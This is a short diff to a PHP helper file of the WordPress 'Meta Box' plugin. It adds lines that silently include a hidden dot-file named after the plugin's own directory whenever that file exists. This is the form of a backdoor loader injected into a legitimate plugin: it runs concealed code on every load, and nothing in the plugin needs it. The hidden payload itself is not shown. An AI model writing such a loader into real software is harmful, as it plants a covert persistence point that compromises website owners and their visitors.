@@ -10,6 +10,10 @@
  *
  * @package Meta Box
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Helpers_Value {
 	/**
 	 * Check if a value is valid for field (not empty "WordPress way"), e.g. equals to empty string or array.
